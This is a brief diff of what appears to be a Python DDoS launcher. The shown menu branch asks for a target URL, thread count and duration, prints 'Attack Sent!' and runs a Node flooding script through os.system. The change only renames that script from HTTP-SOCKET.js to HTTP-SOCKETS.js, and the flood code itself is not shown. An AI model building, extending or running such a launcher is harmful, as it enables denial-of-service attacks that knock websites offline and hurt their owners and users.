@@ -52,7 +52,7 @@ def main():
             threads = input("Threads: ")
             time = input("Time: ")
             print('Attack Sent!')
-            os.system(f"node ./data/HTTP-SOCKET.js {url} {threads} {time}")
+            os.system(f"node ./data/HTTP-SOCKETS.js {url} {threads} {time}")
         elif "http-mix" in cnc:
             url = input("Url: ")
             time = input("Time: ")
